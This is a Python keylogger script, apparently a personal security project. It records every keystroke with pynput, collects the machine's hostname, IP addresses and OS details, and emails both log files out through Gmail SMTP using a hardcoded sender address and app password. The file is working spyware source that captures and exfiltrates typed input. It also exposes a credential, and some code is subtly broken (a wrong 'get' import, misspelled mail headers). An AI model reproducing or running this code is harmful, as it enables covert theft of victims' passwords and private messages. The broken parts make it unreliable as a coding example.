from webbrowser import get

import pynput
from pynput.keyboard import Key, Listener

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

keys_information = "key_log.txt"
sys_information = "sys_info.txt"

from_addr = "tharilaki82@gmail.com"
toaddress = "tharilaki82@gmail.com"
password = "wstqisdjuuvmgphe"
body = "hiiiii"

path = "E:\\Cyber security projects\\Keylogger\\keylogger\\project"
extend = "\\"

keys = []


def send_email(filename, attachment, toaddress):

    msg = MIMEMultipart()

    msg['From'] = from_addr
    msg['To'] = toaddress
    msg['Subject'] = "Log file"

    body = "This is the body"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octed-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Desposion', "attachment; filename %s" %filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_addr, password)
    text = msg.as_string()
    s.sendmail(from_addr, toaddress, text)
    s.quit()

def system_info():
    with open(path + extend + sys_information, "a") as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)

        try:
            public_IP = get("https://api.ipify.org").text
            f.write("Public IP Address : "+public_IP)
        except Exception:
            f.write("Couldn't get public IP Address\n")
        f.write("Local IP Address : "+IPAddress+"\n")
        f.write("Processor info : "+platform.processor()+"\n")
        f.write("System info : " + platform.system() + "\n")
        f.write("Version info : " + platform.version() + "\n")
        f.write("Machine info : " + platform.machine() + "\n")

        f.close()

system_info()

def press(key):
    global keys
    keys.append(key)
    write_file(keys)
    keys =[]
def release(key):
    if key == Key.esc:
        send_email(keys_information, path + extend + keys_information, toaddress)
        send_email(sys_information, path + extend + sys_information, toaddress)
        return False

def write_file(keys):
    with open(path + extend + keys_information, "a") as f:
        for key in keys:
            if key == Key.space:
                f.write('\n')
            elif hasattr(key, 'char'):
                f.write(key.char)



with Listener(on_press=press, on_release=release) as listener:
    listener.join()

#hi